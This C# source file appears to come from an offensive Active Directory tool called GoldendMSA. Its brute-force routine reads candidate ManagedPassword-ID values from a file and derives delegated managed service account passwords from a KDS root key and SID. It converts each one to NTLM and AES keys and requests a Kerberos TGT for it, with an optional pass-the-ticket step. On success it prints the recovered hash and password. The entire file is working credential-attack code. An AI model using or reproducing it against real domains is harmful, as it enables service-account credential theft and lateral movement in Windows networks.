using System;
using System.IO;
using System.Security.Principal;

namespace GoldendMSA
{
    public static class BruteForceDmsa
    {
        public static void BruteForce(SecurityIdentifier sid, string base64Kds, string fileName, string username,
            string domainName, bool ptt = false, bool verbose = false)
        {
            var (dcFqdn, dcIp) = LdapUtils.GetDomainControllerInfoAlt(domainName);
            if (!string.IsNullOrEmpty(dcIp))
                BruteForceByFile(sid, base64Kds, fileName, username, dcIp, domainName, ptt, verbose);
            else
                Console.WriteLine("Faced issues when trying to resolve the DC's IP.");
        }

        private static void BruteForceByFile(SecurityIdentifier sid, string base64Kds, string fileName, string username,
            string dcIp, string domainName, bool ptt, bool verbose)
        {
            try
            {
                var lines = File.ReadAllLines(fileName);

                for (var i = 0; i < lines.Length; i++) lines[i] = lines[i].Trim();

                for (var i = 0; i < lines.Length; i++)
                {
                    var line = lines[i];

                    if (string.IsNullOrEmpty(line))
                        continue;

                    line = line.Trim();
                    base64Kds = base64Kds.Trim();
                    var managedPasswordId = Program.ProcessComputePwdOptions(sid, base64Kds, line, null, null, false);
                    // var decodedData = Convert.FromBase64String(managedPasswordID);
                    var ntlmHash = Helpers.ConvertBase64ToNtlm(managedPasswordId);
                    if (verbose)
                        Console.WriteLine(
                            "[>] Action: Ask TGT (attempt #" + i + ") for " + domainName + "\\" + username);
                    if (Helpers.Base64ToAes(username, domainName, managedPasswordId, true, ptt, verbose) == 1)
                    {
                        Console.WriteLine($"NTLM Hash:\t{ntlmHash}");
                        Console.WriteLine();
                        Console.WriteLine("ManagedPassword-ID:\t" + line);
                        Console.WriteLine();
                        Console.WriteLine("Base64 Encoded Password:\t" + managedPasswordId);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                if (verbose) Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}